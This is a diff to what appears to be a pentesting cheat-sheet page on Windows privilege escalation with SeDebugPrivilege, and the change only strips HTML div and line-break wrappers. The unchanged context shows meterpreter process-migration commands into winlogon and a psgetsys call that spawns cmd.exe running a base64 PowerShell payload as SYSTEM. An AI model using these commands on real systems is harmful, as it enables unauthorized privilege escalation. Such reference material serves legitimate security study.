@@ -10,8 +10,6 @@ tags: ["SeDebugPrivilege", "Windows", "potato", "privesc", "fullpower"]
 {{< tab set1 tab2 >}}psgetsys.ps1{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
 # Inside meterpreter
 ps winlogon
@@ -22,12 +20,8 @@ ps winlogon
 migrate <PID>
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
-
-<div>
 
 ```console
 # Import module
@@ -38,10 +32,6 @@ migrate <PID>
 ImpersonateFromParentPid -ppid <PID> -command "c:\windows\system32\cmd.exe" -cmdargs "/c <POWERSHELL_3_BASE64>"
 ```
 
-</div>
-
 <small>*Ref: [psgetsys](https://github.com/decoder-it/psgetsystem)*</small>
 
 {{< /tabcontent >}}
-
-<br>
